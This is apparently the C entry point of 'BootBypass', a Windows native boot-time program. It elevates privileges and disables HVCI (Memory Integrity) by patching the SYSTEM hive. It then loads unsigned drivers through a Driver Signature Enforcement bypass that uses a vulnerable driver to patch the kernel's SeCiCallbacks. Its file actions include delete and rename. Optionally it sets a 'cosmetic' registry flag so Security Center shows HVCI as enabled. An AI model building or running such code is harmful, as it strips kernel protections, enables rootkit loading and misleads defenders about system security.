// ============================================================================
// BootManager — NATIVE entry point and main execution loop (BB variant)
//
// NtProcessStartup is invoked directly by the NT kernel during SMSS phase.
// Responsibilities:
//   1. Elevate process privileges (SeLoadDriver, SeBackup, SeRestore, SeShutdown)
//   2. Load and parse drivers.ini from \SystemRoot\
//   3. Resolve kernel offsets (INI → scanner fallback; no explicit OffsetSource)
//   4. Disable HVCI if active (patches SYSTEM hive, then reboots)
//   5. Execute driver actions: LOAD (with or without DSE bypass), UNLOAD,
//      RENAME, DELETE
//   6. Optionally restore HVCI hive entry and set cosmetic registry flag
//
// g_OriginalCallback holds the DSE callback address saved before patching.
// It survives across reboots via [DSE_STATE] in drivers.ini.
// ============================================================================

#include "BootManager.h"
#include "SetupManager.h"
#include "OffsetFinder.h"

// Saved SeCiCallbacks slot value before DSE patching.
// Populated by ExecuteAutoPatchLoad; persisted to drivers.ini across reboots.
static ULONGLONG g_OriginalCallback = 0;

// Main entry point for the NATIVE subsystem process.
// Peb: pointer to the process PEB (unused; SMSS passes a minimal structure).
__declspec(noreturn) void __stdcall NtProcessStartup(void* Peb) {
    INI_ENTRY entries[MAX_ENTRIES];
    CONFIG_SETTINGS config;
    ULONG entryCount, i;
    PWSTR iniContent = NULL;
    NTSTATUS status;
    BOOLEAN bOld;
    BOOLEAN skipPatch;

    // Enable required privileges for driver/file operations
    RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &bOld);
    RtlAdjustPrivilege(SE_BACKUP_PRIVILEGE, TRUE, FALSE, &bOld);
    RtlAdjustPrivilege(SE_RESTORE_PRIVILEGE, TRUE, FALSE, &bOld);
    RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &bOld);

    // Load configuration file
    if (!ReadIniFile(L"\\??\\C:\\Windows\\drivers.ini", &iniContent)) {
        DisplayMessage(L"ERROR: drivers.ini not found\r\n");
        NtTerminateProcess((HANDLE)-1, STATUS_SUCCESS);
    }

    // Parse INI entries and global config
    entryCount = ParseIniFile(iniContent, entries, MAX_ENTRIES, &config);
    FreeIniFileBuffer(iniContent);
    iniContent = NULL;

    // Apply verbose mode from config (must be set before any further DisplayMessage calls)
    g_VerboseMode = config.Verbose;
    DisplayMessage(L"BootBypass - Modular Driver Loader\r\n====================================\r\n");

    if (g_VerboseMode) {
        WCHAR hexBuf[32];
        DisplayMessage(L"INFO: Offsets from INI:\r\n");
        ULONGLONGToHexString(config.Offset_SeCiCallbacks, hexBuf, TRUE);
        DisplayMessage(L"  SeCiCallbacks = "); DisplayMessage(hexBuf); DisplayMessage(L"\r\n");
        ULONGLONGToHexString(config.Offset_Callback, hexBuf, TRUE);
        DisplayMessage(L"  Callback     = "); DisplayMessage(hexBuf); DisplayMessage(L"\r\n");
        ULONGLONGToHexString(config.Offset_SafeFunction, hexBuf, TRUE);
        DisplayMessage(L"  SafeFunction = "); DisplayMessage(hexBuf); DisplayMessage(L"\r\n");
    }

    // Run the heuristic scanner only when INI offsets are absent (AUTO mode).
    // The scanner reads ntoskrnl.exe from disk and may take ~50 ms on a cold SSD.
    if (config.Offset_SeCiCallbacks == 0 || config.Offset_SafeFunction == 0) {
        FindKernelOffsetsLocally(&config);
        if (g_VerboseMode) {
            WCHAR hexBuf[32];
            DisplayMessage(L"INFO: Offsets after local scan:\r\n");
            ULONGLONGToHexString(config.Offset_SeCiCallbacks, hexBuf, TRUE);
            DisplayMessage(L"  SeCiCallbacks = "); DisplayMessage(hexBuf); DisplayMessage(L"\r\n");
            ULONGLONGToHexString(config.Offset_Callback, hexBuf, TRUE);
            DisplayMessage(L"  Callback     = "); DisplayMessage(hexBuf); DisplayMessage(L"\r\n");
            ULONGLONGToHexString(config.Offset_SafeFunction, hexBuf, TRUE);
            DisplayMessage(L"  SafeFunction = "); DisplayMessage(hexBuf); DisplayMessage(L"\r\n");
        }
    }

    // Check if execution is enabled in config
    if (!config.Execute) {
        DisplayMessage(L"EXECUTION DISABLED in Config. Exiting.\r\n");
        NtTerminateProcess((HANDLE)-1, STATUS_SUCCESS);
    }

    // Validate parsed entries
    if (entryCount == 0) {
        DisplayMessage(L"ERROR: No INI entries\r\n");
        NtTerminateProcess((HANDLE)-1, STATUS_SUCCESS);
    }

    // Check HVCI status and disable if needed (triggers reboot if active)
    skipPatch = CheckAndDisableHVCI();

    if (skipPatch) {
        if (g_VerboseMode) {
            DisplayMessage(L"INFO: Restart required before continuing driver operations\r\n");
        } else {
            DisplayAlwaysMessage(L"Restart required\r\n");
        }
        NtTerminateProcess((HANDLE)-1, STATUS_SUCCESS);
    }

    // Deploy or clean up HvciShutdownSvc depending on RestoreHVCI setting.
    // Must run after HVCI check so that System32 is writable and the SYSTEM
    // hive is in its final state for this boot cycle.
    if (config.RestoreHVCI) {
        ExtractHvciShutdownSvcAndRegisterService();
    } else {
        CleanupHvciShutdownSvc();
    }

    // Restore saved DSE callback address from previous run (if exists)
    if (g_OriginalCallback == 0) LoadStateSection(&g_OriginalCallback);

    // Process all INI entries sequentially
    for (i = 0; i < entryCount; i++) {
        // Skip empty entries
        if (entries[i].ServiceName[0] == 0 && entries[i].DisplayName[0] == 0) continue;
        
        DisplayMessage(L"\r\n["); DisplayMessage(entries[i].DisplayName); DisplayMessage(L"]\r\n");

        // Skip autopatch operations if waiting for HVCI reboot
        if (skipPatch && entries[i].AutoPatch) {
            DisplayMessage(L"SKIPPED: Waiting for HVCI reboot\r\n");
            continue;
        }

        switch (entries[i].Action) {
            case ACTION_LOAD:
                if (entries[i].AutoPatch) {
                    // Full DSE bypass sequence: load vuln driver -> patch -> load target -> restore
                    ExecuteAutoPatchLoad(&entries[i], &config, &g_OriginalCallback);
                } else {
                    // Standard driver load without DSE patching
                    if (entries[i].CheckIfLoaded && IsDriverLoaded(entries[i].ServiceName)) {
                        DisplayMessage(L"SKIPPED: Already loaded\r\n");
                    } else {
                        status = LoadDriver(entries[i].ServiceName, entries[i].ImagePath, entries[i].DriverType, entries[i].StartType);
                        if (NT_SUCCESS(status) || status == STATUS_IMAGE_ALREADY_LOADED) DisplayMessage(L"SUCCESS: Driver loaded\r\n");
                        else { DisplayMessage(L"FAILED: Load error"); DisplayStatus(status); }
                    }
                }
                break;

            case ACTION_UNLOAD:
                // Unload kernel driver
                if (!IsDriverLoaded(entries[i].ServiceName)) DisplayMessage(L"SKIPPED: Not loaded\r\n");
                else {
                    status = UnloadDriver(entries[i].ServiceName);
                    if (NT_SUCCESS(status)) DisplayMessage(L"SUCCESS: Unloaded\r\n");
                    else { DisplayMessage(L"FAILED: Unload error"); DisplayStatus(status); }
                }
                break;

            case ACTION_RENAME:
                // Rename file or directory
                ExecuteRename(&entries[i]);
                break;

            case ACTION_DELETE:
                // Delete file or directory (recursive if configured)
                ExecuteDelete(&entries[i]);
                break;
        }
    }

    DisplayMessage(L"\r\n====================================\r\n");

    // Restore HVCI in the SYSTEM hive so that the next boot re-enables Memory
    // Integrity.  Only done when RestoreHVCI=YES and no HVCI reboot is pending.
    if (!skipPatch && config.RestoreHVCI) RestoreHVCI();

    // Mirror the live value back into the volatile DeviceGuard registry key so
    // that Security Center and system tools report HVCI as enabled.
    // Skipped when RestoreHVCI=NO — caller expects the Enabled=0 value to stay.
    if (!skipPatch && config.RestoreHVCI) {
        DisplayMessage(L"INFO: Setting cosmetic HVCI registry flag...\r\n");
        if (NT_SUCCESS(SetHVCIRegistryFlag(TRUE))) {
            DisplayMessage(L"SUCCESS: HVCI appears enabled (registry only)\r\n");
        }
    }
    
    NtTerminateProcess((HANDLE)-1, STATUS_SUCCESS);
    __assume(0);
}
